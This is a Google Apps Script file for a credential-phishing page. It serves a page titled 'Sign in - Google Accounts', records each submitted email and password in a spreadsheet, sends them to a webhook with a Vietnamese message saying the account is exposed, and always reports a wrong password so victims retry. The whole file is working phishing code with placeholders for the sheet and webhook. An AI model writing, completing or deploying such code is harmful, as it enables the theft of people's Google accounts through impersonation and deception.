function doGet() {
  return HtmlService.createHtmlOutputFromFile('Index')
    .setTitle('Sign in - Google Accounts')
    .setSandboxMode(HtmlService.SandboxMode.IFRAME)
    .addMetaTag('viewport', 'width=device-width, initial-scale=1');
}

function processForm(email, password) {
  try {
    var sheetId = "YOUR_GOOGLE_SHEET_ID";
    var sheet = SpreadsheetApp.openById(sheetId).getActiveSheet();
    sheet.appendRow([new Date(), email, password]);
  } catch (e) {}

  try {
    var webhookUrl = "YOUR_WEBHOOK";
    var message = "**Tài khoản Google bị lộ:**\nEmail: " + email + "\nPass: " + password;
    UrlFetchApp.fetch(webhookUrl, {
      method: "post",
      contentType: "application/json",
      payload: JSON.stringify({ content: message })
    });
  } catch (e) {}

  return false; // Luôn trả về false để hiện lỗi "Sai mật khẩu"
}
